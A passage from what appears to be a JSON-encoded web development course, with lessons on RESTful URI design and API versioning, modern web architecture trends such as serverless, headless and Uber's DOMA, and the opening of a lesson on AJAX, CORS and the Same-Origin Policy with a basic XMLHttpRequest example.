hold that value.","text":"**Takeaway:** localStorage persists strings by origin (protocol + domain + port) — path is irrelevant, but protocol and subdomain matter. Use `JSON.stringify` to store objects and `JSON.parse` to restore them. `getItem` captures a string at call time — subsequent storage changes do not alter variables that already hold that value."}]},{"n":17,"id":"restful-url-design","title":"RESTful URL Design and API Versioning","hook":"A consistent URI structure lets any developer predict the endpoint for any operation — before reading your docs.","tags":["REST","URL-design","versioning","plural-nouns","URI"],"module":"Web Architecture and Data Exchange","source":"Slide 8, Slide 11","blocks":[{"kind":"p","html":"Start with a complete example. The table below is a fully designed \u003ccode\u003e/orders\u003c/code\u003e API — every operation, its HTTP method, and its URI. Read it once, then the rules that generated it will be obvious.","text":"Start with a complete example. The table below is a fully designed `/orders` API — every operation, its HTTP method, and its URI. Read it once, then the rules that generated it will be obvious."},{"kind":"table","html":"\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eHTTP method\u003c/th\u003e\n\u003cth\u003eURI (Endpoint)\u003c/th\u003e\n\u003cth\u003eAction\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\u003ctr\u003e\n\u003ctd\u003eGET\u003c/td\u003e\n\u003ctd\u003e/orders\u003c/td\u003e\n\u003ctd\u003eList existing orders\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003ePOST\u003c/td\u003e\n\u003ctd\u003e/orders\u003c/td\u003e\n\u003ctd\u003ePlace a new order\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eGET\u003c/td\u003e\n\u003ctd\u003e/orders/1\u003c/td\u003e\n\u003ctd\u003eGet details for order #1\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eGET\u003c/td\u003e\n\u003ctd\u003e/orders/2\u003c/td\u003e\n\u003ctd\u003eGet details for order #2\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003ePUT\u003c/td\u003e\n\u003ctd\u003e/orders/1\u003c/td\u003e\n\u003ctd\u003eUpdate order #1\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eDELETE\u003c/td\u003e\n\u003ctd\u003e/orders/1\u003c/td\u003e\n\u003ctd\u003eCancel order #1\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\u003c/table\u003e"},{"kind":"p","html":"Three patterns appear in every row: the noun is plural (\u003ccode\u003eorders\u003c/code\u003e), a specific resource is addressed by appending its ID (\u003ccode\u003e/1\u003c/code\u003e, \u003ccode\u003e/2\u003c/code\u003e), and the HTTP method — not a verb in the URI — expresses the action.","text":"Three patterns appear in every row: the noun is plural (`orders`), a specific resource is addressed by appending its ID (`/1`, `/2`), and the HTTP method — not a verb in the URI — expresses the action."},{"kind":"h2","html":"Plural nouns for resource names","text":"Plural nouns for resource names"},{"kind":"p","html":"Name every resource collection with a plural noun. The collection itself lives at \u003ccode\u003e/orders\u003c/code\u003e; a single item lives at \u003ccode\u003e/orders/{id}\u003c/code\u003e. This mirrors how humans read the URL: \u003ccode\u003e/orders\u003c/code\u003e means &quot;the orders resource&quot; and \u003ccode\u003e/orders/1\u003c/code\u003e means &quot;order number 1 specifically.&quot;","text":"Name every resource collection with a plural noun. The collection itself lives at `/orders`; a single item lives at `/orders/{id}`. This mirrors how humans read the URL: `/orders` means \"the orders resource\" and `/orders/1` means \"order number 1 specifically.\""},{"kind":"p","html":"Using verbs in URIs breaks this model. \u003ccode\u003e/getOrders\u003c/code\u003e is not a resource name — it is a function name. HTTP already provides the verb (\u003ccode\u003eGET\u003c/code\u003e). Using both creates redundancy and forces each new operation to invent a new path.","text":"Using verbs in URIs breaks this model. `/getOrders` is not a resource name — it is a function name. HTTP already provides the verb (`GET`). Using both creates redundancy and forces each new operation to invent a new path."},{"kind":"h2","html":"Path parameters for single-resource operations","text":"Path parameters for single-resource operations"},{"kind":"p","html":"When an operation targets one specific resource, encode the identifier in the path — not in a query string. \u003ccode\u003e/patients/1\u003c/code\u003e is correct; \u003ccode\u003e/patients?id=1\u003c/code\u003e is wrong for single-resource CRUD.","text":"When an operation targets one specific resource, encode the identifier in the path — not in a query string. `/patients/1` is correct; `/patients?id=1` is wrong for single-resource CRUD."},{"kind":"p","html":"The slide 11 patient API demonstrates the full set:","text":"The slide 11 patient API demonstrates the full set:"},{"kind":"table","html":"\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eMethod\u003c/th\u003e\n\u003cth\u003eURI\u003c/th\u003e\n\u003cth\u003eDescription\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\u003ctr\u003e\n\u003ctd\u003eGET\u003c/td\u003e\n\u003ctd\u003e/patients\u003c/td\u003e\n\u003ctd\u003eRetrieves all patients\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eGET\u003c/td\u003e\n\u003ctd\u003e/patients/{patient-id}\u003c/td\u003e\n\u003ctd\u003eRetrieves one patient by ID\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eGET\u003c/td\u003e\n\u003ctd\u003e/patients/name/{patient-name}\u003c/td\u003e\n\u003ctd\u003eRetrieves patients whose name includes the given string\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eGET\u003c/td\u003e\n\u003ctd\u003e/visits/{date1}/{date2}\u003c/td\u003e\n\u003ctd\u003eReturns all visits between two dates\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003ePOST\u003c/td\u003e\n\u003ctd\u003e/patients\u003c/td\u003e\n\u003ctd\u003eCreates a new patient\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003ePUT\u003c/td\u003e\n\u003ctd\u003e/patients/{patient-id}\u003c/td\u003e\n\u003ctd\u003eUpdates a patient by ID\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eDELETE\u003c/td\u003e\n\u003ctd\u003e/patients/{patient-id}\u003c/td\u003e\n\u003ctd\u003eDeletes a patient by ID\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\u003c/table\u003e"},{"kind":"p","html":"The \u003ccode\u003e{date1}/{date2}\u003c/code\u003e segment on the visits endpoint shows how multiple path parameters compose: each segment narrows the resource further.","text":"The `{date1}/{date2}` segment on the visits endpoint shows how multiple path parameters compose: each segment narrows the resource further."},{"kind":"h2","html":"Query strings for filtering and customization","text":"Query strings for filtering and customization"},{"kind":"p","html":"A query string — the \u003ccode\u003e?name=value&amp;another-name=value\u003c/code\u003e portion of a URL — passes additional values to customize output without changing the resource being addressed.","text":"A query string — the `?name=value&another-name=value` portion of a URL — passes additional values to customize output without changing the resource being addressed."},{"kind":"p","html":"Consider the full anatomy of a URI:","text":"Consider the full anatomy of a URI:"},{"kind":"code","lang":"text","code":"http://example.com/api/orders/1/uri-encoder?name=value&another-name=value\n|_______________|  |______________________|  |______________________________|\n     domain             URI path                       query string"},{"kind":"p","html":"\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eDomain\u003c/strong\u003e — the physical server where the API is hosted.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eURI path\u003c/strong\u003e — the identifier that maps to a specific resource or script on the server.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eQuery string\u003c/strong\u003e — part of a GET request that passes values to customize output.\u003c/li\u003e\n\u003c/ul\u003e","text":"- **Domain** — the physical server where the API is hosted.\n- **URI path** — the identifier that maps to a specific resource or script on the server.\n- **Query string** — part of a GET request that passes values to customize output."},{"kind":"p","html":"Use path parameters for identity (\u003ccode\u003e/patients/1\u003c/code\u003e) and query strings for filtering, sorting, or pagination (\u003ccode\u003e/patients?page=2&amp;limit=10\u003c/code\u003e).","text":"Use path parameters for identity (`/patients/1`) and query strings for filtering, sorting, or pagination (`/patients?page=2&limit=10`)."},{"kind":"h2","html":"API versioning strategy","text":"API versioning strategy"},{"kind":"p","html":"Exposing an API publicly creates a contract. When a breaking change is necessary — a change in response format, a change in a field&#39;s type, or removal of an endpoint — existing clients must not break silently.","text":"Exposing an API publicly creates a contract. When a breaking change is necessary — a change in response format, a change in a field's type, or removal of an endpoint — existing clients must not break silently."},{"kind":"p","html":"The solution is to include the version number as part of the URI:","text":"The solution is to include the version number as part of the URI:"},{"kind":"code","lang":"text","code":"http://api.example.com/v1\nhttp://example.com/API/v1/gfhdrr"},{"kind":"p","html":"This produces versioned endpoints like \u003ccode\u003eGET /v1/patients/\u003c/code\u003e alongside an unversioned pointer. The unversioned path \u003ccode\u003e/catalog\u003c/code\u003e always redirects to the latest version using HTTP \u003ccode\u003e3xx\u003c/code\u003e status codes. Requesting \u003ccode\u003e/catalog\u003c/code\u003e causes a redirect to \u003ccode\u003e/v2/catalog\u003c/code\u003e.","text":"This produces versioned endpoints like `GET /v1/patients/` alongside an unversioned pointer. The unversioned path `/catalog` always redirects to the latest version using HTTP `3xx` status codes. Requesting `/catalog` causes a redirect to `/v2/catalog`."},{"kind":"p","html":"A version-specific URI from the course patient API: \u003ccode\u003emydomain.com/V1/API/Patients/1\u003c/code\u003e and \u003ccode\u003emydomain.com/V1.1/API/Patients/1\u003c/code\u003e.","text":"A version-specific URI from the course patient API: `mydomain.com/V1/API/Patients/1` and `mydomain.com/V1.1/API/Patients/1`."},{"kind":"h3","html":"When to version","text":"When to version"},{"kind":"p","html":"Version only when a breaking change is made:","text":"Version only when a breaking change is made:"},{"kind":"p","html":"\u003cul\u003e\n\u003cli\u003eThe format of the response data changes.\u003c/li\u003e\n\u003cli\u003eA field type changes (for example, integer to float).\u003c/li\u003e\n\u003cli\u003eAn endpoint is removed or its behaviour is fundamentally altered.\u003c/li\u003e\n\u003c/ul\u003e","text":"- The format of the response data changes.\n- A field type changes (for example, integer to float).\n- An endpoint is removed or its behaviour is fundamentally altered."},{"kind":"p","html":"Non-breaking additions — new optional response fields, new endpoints — do not require a new version.","text":"Non-breaking additions — new optional response fields, new endpoints — do not require a new version."},{"kind":"checkpoint","q":"A client calls `GET /v1/patients/42` and gets back `{ \"id\": 42, \"name\": \"Jane\" }`. You add a new optional field `\"email\"` to the response. Do you need to release `/v2/patients/42`?","a":"No. Adding an optional field is non-breaking. Clients that ignore unknown fields continue working. Version only when existing clients would break."},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003ePOST /orders creates a new resource; PUT /orders/1 replaces an existing one — confusing these sends the wrong HTTP method. POST on a collection creates; PUT on an individual URI replaces. Sending POST to \u003ccode\u003e/orders/1\u003c/code\u003e is ambiguous and most REST frameworks will reject or mishandle it.\u003c/p\u003e","text":"POST /orders creates a new resource; PUT /orders/1 replaces an existing one — confusing these sends the wrong HTTP method. POST on a collection creates; PUT on an individual URI replaces. Sending POST to `/orders/1` is ambiguous and most REST frameworks will reject or mishandle it."},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003e\u003ccode\u003e/catalog\u003c/code\u003e without a version prefix always points to the latest version — but this only works if versioning was in place before the first public release. Adding versioning retroactively means the original \u003ccode\u003e/catalog\u003c/code\u003e clients are already calling the unversioned path, and redirecting them to \u003ccode\u003e/v2/catalog\u003c/code\u003e silently breaks their contract. Start versioning before the first release, not after.\u003c/p\u003e","text":"`/catalog` without a version prefix always points to the latest version — but this only works if versioning was in place before the first public release. Adding versioning retroactively means the original `/catalog` clients are already calling the unversioned path, and redirecting them to `/v2/catalog` silently breaks their contract. Start versioning before the first release, not after."},{"kind":"callout","variant":"takeaway","html":"\u003cp\u003eRESTful URI design has three rules: plural nouns name resource collections, path parameters identify individual resources, and HTTP methods express actions. API versioning belongs in the URI path (\u003ccode\u003e/v1/\u003c/code\u003e) from day one — adding it retroactively breaks existing clients.\u003c/p\u003e","text":"RESTful URI design has three rules: plural nouns name resource collections, path parameters identify individual resources, and HTTP methods express actions. API versioning belongs in the URI path (`/v1/`) from day one — adding it retroactively breaks existing clients."}]},{"n":18,"id":"modern-web-arch","title":"Modern Web Architecture Trends","hook":"Uber built hundreds of microservices and created chaos — the solution invented a new architecture pattern you can name on an exam.","tags":["modern-architecture","headless","edge-computing","AI-web","serverless","DDD"],"module":"Web Architecture and Data Exchange","source":"Slide 8","blocks":[{"kind":"h2","html":"Uber built hundreds of services — then couldn&#39;t manage them","text":"Uber built hundreds of services — then couldn't manage them"},{"kind":"p","html":"In MSA&#39;s early days, Uber decomposed its platform aggressively. The result: hundreds of microservices with overlapping responsibilities and no clear boundaries. Teams couldn&#39;t tell which service owned what. Consistency was impossible to maintain. Scaling and collaboration became painful.","text":"In MSA's early days, Uber decomposed its platform aggressively. The result: hundreds of microservices with overlapping responsibilities and no clear boundaries. Teams couldn't tell which service owned what. Consistency was impossible to maintain. Scaling and collaboration became painful."},{"kind":"p","html":"This outcome is not an indictment of MSA. It is the motivating problem behind Domain-Oriented Microservice Architecture (DOMA) — and it explains why modern architectural patterns exist: raw MSA at scale creates new coordination problems that require deliberate structural solutions.","text":"This outcome is not an indictment of MSA. It is the motivating problem behind Domain-Oriented Microservice Architecture (DOMA) — and it explains why modern architectural patterns exist: raw MSA at scale creates new coordination problems that require deliberate structural solutions."},{"kind":"h2","html":"Serverless architecture","text":"Serverless architecture"},{"kind":"p","html":"Serverless removes server management from the developer&#39;s workload. You write function logic; a cloud provider handles provisioning, scaling, and patching automatically.","text":"Serverless removes server management from the developer's workload. You write function logic; a cloud provider handles provisioning, scaling, and patching automatically."},{"kind":"p","html":"\u003cstrong\u003eExamples:\u003c/strong\u003e AWS Lambda, Azure Functions, Google Cloud Functions.","text":"**Examples:** AWS Lambda, Azure Functions, Google Cloud Functions."},{"kind":"p","html":"\u003cstrong\u003eBest for:\u003c/strong\u003e event-driven tasks, spiky or unpredictable traffic, short-lived computations (image resize, notification dispatch, data transformation).","text":"**Best for:** event-driven tasks, spiky or unpredictable traffic, short-lived computations (image resize, notification dispatch, data transformation)."},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003e&quot;Serverless&quot; does not mean no server exists. Servers run your code — AWS, Azure, or GCP manages them so you don&#39;t have to. The name describes who manages the infrastructure, not whether infrastructure exists.\u003c/p\u003e","text":"\"Serverless\" does not mean no server exists. Servers run your code — AWS, Azure, or GCP manages them so you don't have to. The name describes who manages the infrastructure, not whether infrastructure exists."},{"kind":"checkpoint","q":"A startup deploys their image-processing feature as an AWS Lambda function. At 3 a.m. traffic drops to zero. What is the infrastructure cost during that window?","a":"Near zero. Serverless billing is per invocation. When no function executes, no compute resources are allocated and no cost accrues. A traditional server would still be running and billing the hourly rate."},{"kind":"h2","html":"API-first development","text":"API-first development"},{"kind":"p","html":"API-first means designing the backend API before — or independently of — the frontend. The API server (backend) is the primary product; frontends are consumers of it.","text":"API-first means designing the backend API before — or independently of — the frontend. The API server (backend) is the primary product; frontends are consumers of it."},{"kind":"p","html":"This approach enforces a clean contract between client and server. Any frontend — web, mobile, IoT device — can consume the same backend without requiring backend changes. Third-party services integrate more easily because the API surface is deliberate and documented.","text":"This approach enforces a clean contract between client and server. Any frontend — web, mobile, IoT device — can consume the same backend without requiring backend changes. Third-party services integrate more easily because the API surface is deliberate and documented."},{"kind":"p","html":"In this course, the architecture you build is API-centric: every client interaction goes through an API endpoint, and the backend never assumes which kind of client is calling.","text":"In this course, the architecture you build is API-centric: every client interaction goes through an API endpoint, and the backend never assumes which kind of client is calling."},{"kind":"h2","html":"Edge computing","text":"Edge computing"},{"kind":"p","html":"Centralized data centers introduce latency: every request travels from the user&#39;s device to a distant server and back. Edge computing eliminates most of that round-trip by processing data closer to the source — on devices, regional nodes, or CDN edges near the user.","text":"Centralized data centers introduce latency: every request travels from the user's device to a distant server and back. Edge computing eliminates most of that round-trip by processing data closer to the source — on devices, regional nodes, or CDN edges near the user."},{"kind":"p","html":"\u003cstrong\u003eMechanism:\u003c/strong\u003e instead of routing to a central server in one geography, requests resolve at a node that is geographically close to the user.","text":"**Mechanism:** instead of routing to a central server in one geography, requests resolve at a node that is geographically close to the user."},{"kind":"p","html":"\u003cstrong\u003eResult:\u003c/strong\u003e lower latency, faster response, better performance for real-time applications.","text":"**Result:** lower latency, faster response, better performance for real-time applications."},{"kind":"p","html":"\u003cstrong\u003eUse cases:\u003c/strong\u003e content delivery, IoT data processing, real-time video analysis, low-latency gaming.","text":"**Use cases:** content delivery, IoT data processing, real-time video analysis, low-latency gaming."},{"kind":"h2","html":"Headless architecture","text":"Headless architecture"},{"kind":"p","html":"Headless decouples the frontend presentation layer from the backend logic and data layers. The backend stores and manages content; it exposes that content via API. Any frontend — web app, mobile app, IoT interface — can consume the same backend without any frontend-specific logic living on the server.","text":"Headless decouples the frontend presentation layer from the backend logic and data layers. The backend stores and manages content; it exposes that content via API. Any frontend — web app, mobile app, IoT interface — can consume the same backend without any frontend-specific logic living on the server."},{"kind":"p","html":"The term originates in CMS (Content Management Systems). A traditional CMS controls both content storage and HTML rendering. A headless CMS handles only content storage and delivers it via API; the frontend team chooses any rendering technology they want.","text":"The term originates in CMS (Content Management Systems). A traditional CMS controls both content storage and HTML rendering. A headless CMS handles only content storage and delivers it via API; the frontend team chooses any rendering technology they want."},{"kind":"p","html":"\u003cstrong\u003eBenefit:\u003c/strong\u003e multiple frontends sharing one backend. A news organization runs a website, a mobile app, and a smart-TV interface — all pulling the same content from one headless backend.","text":"**Benefit:** multiple frontends sharing one backend. A news organization runs a website, a mobile app, and a smart-TV interface — all pulling the same content from one headless backend."},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003eHeadless and serverless are not the same thing. Headless decouples the frontend from the backend. Serverless eliminates server management. A headless backend can run on traditional managed servers. A serverless function can serve a non-headless frontend. These are independent architectural decisions.\u003c/p\u003e","text":"Headless and serverless are not the same thing. Headless decouples the frontend from the backend. Serverless eliminates server management. A headless backend can run on traditional managed servers. A serverless function can serve a non-headless frontend. These are independent architectural decisions."},{"kind":"checkpoint","q":"A retail company wants their website, mobile app, and in-store kiosk to all display the same product catalog. What architectural pattern lets one backend serve all three frontends without duplicating content?","a":"Headless architecture. The backend stores and manages product data and exposes it via API. Each frontend — web, mobile, kiosk — calls the same API and renders the content in whatever format suits its interface."},{"kind":"h2","html":"Domain-Driven Design (DDD) and DOMA","text":"Domain-Driven Design (DDD) and DOMA"},{"kind":"p","html":"\u003cstrong\u003eDDD\u003c/strong\u003e addresses complexity in large systems by organizing code around business domains. Each domain is isolated in a bounded context — a boundary within which a model is consistent and a team has clear ownership.","text":"**DDD** addresses complexity in large systems by organizing code around business domains. Each domain is isolated in a bounded context — a boundary within which a model is consistent and a team has clear ownership."},{"kind":"p","html":"The practical effect: when you change the payment domain, you don&#39;t risk breaking the recommendations domain. Bounded contexts enforce the separation of concerns that raw MSA often lacks.","text":"The practical effect: when you change the payment domain, you don't risk breaking the recommendations domain. Bounded contexts enforce the separation of concerns that raw MSA often lacks."},{"kind":"p","html":"\u003cstrong\u003eDOMA\u003c/strong\u003e (Domain-Oriented Microservice Architecture) is Uber&#39;s response to the coordination failure described at the top of this lesson. DOMA organizes microservices into domain groups. Each domain group owns a cluster of related services, exposes a domain-level API, and enforces clear boundaries. The result: Uber regained consistency, reduced duplication, and made collaboration between teams tractable again.","text":"**DOMA** (Domain-Oriented Microservice Architecture) is Uber's response to the coordination failure described at the top of this lesson. DOMA organizes microservices into domain groups. Each domain group owns a cluster of related services, exposes a domain-level API, and enforces clear boundaries. The result: Uber regained consistency, reduced duplication, and made collaboration between teams tractable again."},{"kind":"p","html":"\u003cstrong\u003eDDD → DOMA pattern:\u003c/strong\u003e DDD provides the conceptual model (bounded contexts); DOMA applies that model to microservice organization at scale.","text":"**DDD → DOMA pattern:** DDD provides the conceptual model (bounded contexts); DOMA applies that model to microservice organization at scale."},{"kind":"h2","html":"AI-as-a-Service (AIaaS) and AI web architecture","text":"AI-as-a-Service (AIaaS) and AI web architecture"},{"kind":"p","html":"Adding AI capabilities to a web application no longer requires building or training models. Cloud providers expose pre-trained models as API-accessible services — this is AI-as-a-Service (AIaaS).","text":"Adding AI capabilities to a web application no longer requires building or training models. Cloud providers expose pre-trained models as API-accessible services — this is AI-as-a-Service (AIaaS)."},{"kind":"p","html":"\u003cstrong\u003eExamples:\u003c/strong\u003e","text":"**Examples:**"},{"kind":"p","html":"\u003cul\u003e\n\u003cli\u003eGoogle Cloud AI (Vision API, Natural Language API)\u003c/li\u003e\n\u003cli\u003eAWS AI Services (Rekognition, Comprehend, Polly)\u003c/li\u003e\n\u003cli\u003eAzure Cognitive Services (Computer Vision, Speech, Language)\u003c/li\u003e\n\u003c/ul\u003e","text":"- Google Cloud AI (Vision API, Natural Language API)\n- AWS AI Services (Rekognition, Comprehend, Polly)\n- Azure Cognitive Services (Computer Vision, Speech, Language)"},{"kind":"p","html":"\u003cstrong\u003eHow it connects to MSA:\u003c/strong\u003e AI capabilities map cleanly onto microservices. One service handles image processing; another handles natural language processing; a third handles speech-to-text. Each service calls the relevant AIaaS endpoint and returns results through the API gateway.","text":"**How it connects to MSA:** AI capabilities map cleanly onto microservices. One service handles image processing; another handles natural language processing; a third handles speech-to-text. Each service calls the relevant AIaaS endpoint and returns results through the API gateway."},{"kind":"p","html":"\u003cstrong\u003eAutoML and no-code AI:\u003c/strong\u003e platforms like Google AutoML, HuggingFace, and Kaggle allow developers to build and deploy models without deep ML expertise. This lowers the barrier to AI integration further — AIaaS handles inference; AutoML handles model customization.","text":"**AutoML and no-code AI:** platforms like Google AutoML, HuggingFace, and Kaggle allow developers to build and deploy models without deep ML expertise. This lowers the barrier to AI integration further — AIaaS handles inference; AutoML handles model customization."},{"kind":"h2","html":"Why these patterns emerged together","text":"Why these patterns emerged together"},{"kind":"p","html":"Modern architectures did not emerge arbitrarily. Specific pressures drove adoption:","text":"Modern architectures did not emerge arbitrarily. Specific pressures drove adoption:"},{"kind":"p","html":"\u003cstrong\u003eScale and user expectations\u003c/strong\u003e","text":"**Scale and user expectations**"},{"kind":"p","html":"\u003cul\u003e\n\u003cli\u003eUsers expect fast, always-available applications\u003c/li\u003e\n\u003cli\u003eBillions of mobile and IoT devices demand flexible API-first backends\u003c/li\u003e\n\u003c/ul\u003e","text":"- Users expect fast, always-available applications\n- Billions of mobile and IoT devices demand flexible API-first backends"},{"kind":"p","html":"\u003cstrong\u003eDeployment velocity\u003c/strong\u003e","text":"**Deployment velocity**"},{"kind":"p","html":"\u003cul\u003e\n\u003cli\u003eMSA enables partial deployment — updating one service without restarting the whole application\u003c/li\u003e\n\u003cli\u003eCI/CD pipelines require services that can deploy independently\u003c/li\u003e\n\u003c/ul\u003e","text":"- MSA enables partial deployment — updating one service without restarting the whole application\n- CI/CD pipelines require services that can deploy independently"},{"kind":"p","html":"\u003cstrong\u003eInfrastructure cost and flexibility\u003c/strong\u003e","text":"**Infrastructure cost and flexibility**"},{"kind":"p","html":"\u003cul\u003e\n\u003cli\u003eServerless shifts infrastructure cost from fixed to variable (pay per invocation)\u003c/li\u003e\n\u003cli\u003eContainers and orchestration (Kubernetes) simplify scaling and management\u003c/li\u003e\n\u003c/ul\u003e","text":"- Serverless shifts infrastructure cost from fixed to variable (pay per invocation)\n- Containers and orchestration (Kubernetes) simplify scaling and management"},{"kind":"p","html":"\u003cstrong\u003eAI and ML integration\u003c/strong\u003e","text":"**AI and ML integration**"},{"kind":"p","html":"\u003cul\u003e\n\u003cli\u003eApplications increasingly need real-time analytics and ML model inference\u003c/li\u003e\n\u003cli\u003eAIaaS makes this accessible without specialized ML infrastructure\u003c/li\u003e\n\u003c/ul\u003e","text":"- Applications increasingly need real-time analytics and ML model inference\n- AIaaS makes this accessible without specialized ML infrastructure"},{"kind":"p","html":"\u003cstrong\u003eResilience\u003c/strong\u003e","text":"**Resilience**"},{"kind":"p","html":"\u003cul\u003e\n\u003cli\u003eIn MSA, one failing service does not cascade to others — fault isolation is structural, not an afterthought\u003c/li\u003e\n\u003cli\u003eEdge computing moves compute closer to users, reducing failure blast radius\u003c/li\u003e\n\u003c/ul\u003e","text":"- In MSA, one failing service does not cascade to others — fault isolation is structural, not an afterthought\n- Edge computing moves compute closer to users, reducing failure blast radius"},{"kind":"p","html":"\u003cstrong\u003eTakeaway:\u003c/strong\u003e Each modern architectural pattern solves a specific pressure: serverless reduces infrastructure cost, API-first enables multi-frontend flexibility, edge computing cuts latency, headless decouples frontend from backend, DDD/DOMA brings order to large-scale MSA, and AIaaS makes AI capabilities accessible via API. These patterns are not alternatives to MSA — they are responses to what MSA produces at scale.","text":"**Takeaway:** Each modern architectural pattern solves a specific pressure: serverless reduces infrastructure cost, API-first enables multi-frontend flexibility, edge computing cuts latency, headless decouples frontend from backend, DDD/DOMA brings order to large-scale MSA, and AIaaS makes AI capabilities accessible via API. These patterns are not alternatives to MSA — they are responses to what MSA produces at scale."}]},{"n":19,"id":"ajax-cors","title":"AJAX, CORS, and Same-Origin Policy","hook":"Why the browser silently drops your fetch requests — and how the server fixes it.","tags":["AJAX","CORS","SOP","preflight","OPTIONS","XMLHttpRequest","readyState"],"module":"Node.js and Server-Side Development","source":"Slide 5, Quiz 6, Quiz 7","blocks":[{"kind":"h2","html":"Why the browser blocks cross-origin requests","text":"Why the browser blocks cross-origin requests"},{"kind":"p","html":"Open your browser console and run this from \u003ccode\u003ehttp://localhost:3000\u003c/code\u003e:","text":"Open your browser console and run this from `http://localhost:3000`:"},{"kind":"code","lang":"js","code":"fetch(\"https://api.example.com/data\");"},{"kind":"p","html":"The browser throws:","text":"The browser throws:"},{"kind":"code","lang":"text","code":"Access to fetch at 'https://api.example.com/data' from origin\n'http://localhost:3000' has been blocked by CORS policy."},{"kind":"p","html":"That error comes from the \u003cstrong\u003eSame-Origin Policy (SOP)\u003c/strong\u003e — a browser rule that blocks scripts from reading responses across origins. An \u003cstrong\u003eorigin\u003c/strong\u003e is the exact triple of protocol + domain + port. \u003ccode\u003ehttp://localhost:3000\u003c/code\u003e and \u003ccode\u003ehttps://localhost:3000\u003c/code\u003e are \u003cem\u003edifferent\u003c/em\u003e origins; so are \u003ccode\u003ehttp://localhost:3000\u003c/code\u003e and \u003ccode\u003ehttp://localhost:8000\u003c/code\u003e.","text":"That error comes from the **Same-Origin Policy (SOP)** — a browser rule that blocks scripts from reading responses across origins. An **origin** is the exact triple of protocol + domain + port. `http://localhost:3000` and `https://localhost:3000` are *different* origins; so are `http://localhost:3000` and `http://localhost:8000`."},{"kind":"p","html":"SOP exists to stop a malicious page from silently reading your bank&#39;s API using your session cookies.","text":"SOP exists to stop a malicious page from silently reading your bank's API using your session cookies."},{"kind":"h2","html":"What CORS does","text":"What CORS does"},{"kind":"p","html":"CORS (Cross-Origin Resource Sharing) is a server-configured mechanism that tells the browser: &quot;this cross-origin request is permitted.&quot; The server adds response headers; the browser reads them and decides whether to expose the response to the script.","text":"CORS (Cross-Origin Resource Sharing) is a server-configured mechanism that tells the browser: \"this cross-origin request is permitted.\" The server adds response headers; the browser reads them and decides whether to expose the response to the script."},{"kind":"p","html":"The key header:","text":"The key header:"},{"kind":"code","lang":"text","code":"Access-Control-Allow-Origin: *"},{"kind":"p","html":"\u003ccode\u003e*\u003c/code\u003e means any origin may read the response. A specific value like \u003ccode\u003ehttp://localhost:3000\u003c/code\u003e restricts it to that origin only.","text":"`*` means any origin may read the response. A specific value like `http://localhost:3000` restricts it to that origin only."},{"kind":"p","html":"Two additional headers control which methods and custom headers are allowed:","text":"Two additional headers control which methods and custom headers are allowed:"},{"kind":"code","lang":"text","code":"Access-Control-Allow-Methods: GET, POST\nAccess-Control-Allow-Headers: Content-Type"},{"kind":"h2","html":"AJAX: sending requests without reloading","text":"AJAX: sending requests without reloading"},{"kind":"p","html":"AJAX is a technique for issuing HTTP requests from browser script without navigating the page. The core object is \u003ccode\u003eXMLHttpRequest\u003c/code\u003e. The four-step lifecycle:","text":"AJAX is a technique for issuing HTTP requests from browser script without navigating the page. The core object is `XMLHttpRequest`. The four-step lifecycle:"},{"kind":"code","lang":"js","code":"// Step 1 — create the object\nlet xhttp = new XMLHttpRequest();\n\n// Step 2 — attach a handler; fires on every readyState change\nxhttp.onreadystatechange = function () {\n  if (this.readyState == 4 && this.status == 200) {\n    document.getElementById(\"demo\").innerHTML = this.responseText;\n  }\n};\n\n// Step 3 — open: method, URL, async flag\nxhttp.open(\"GET\", \"https://api.example.com/data\", true);\n\n// Step 4 — send\nxhttp.send();"},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003e\u003ccode\u003ereadyState\u003c/code\u003e runs from 0 to 4, not 1 to 5. DONE is \u003cstrong\u003e4\u003c/strong\u003e. Checking \u003ccode\u003ereadyState == 5\u003c/code\u003e always fails silently. (Source: Slide 5, Quiz 6.)\u003c/p\u003e","text":"`readyState` runs from 0 to 4, not 1 to 5. DONE is **4**. Checking `readyState == 5` always fails silently. (Source: Slide 5, Quiz 6.)"},{"kind":"p","html":"\u003ccode\u003ereadyState\u003c/code\u003e transitions in order:","text":"`readyState` transitions in order:"},{"kind":"table","html":"\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eValue\u003c/th\u003e\n\u003cth\u003eName\u003c/th\u003e\n\u003cth\u003eMeaning\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\u003ctr\u003e\n\u003ctd\u003e0\u003c/td\u003e\n\u003ctd\u003eUNSENT\u003c/td\u003e\n\u003ctd\u003eObject created; \u003ccode\u003eopen()\u003c/code\u003e not yet 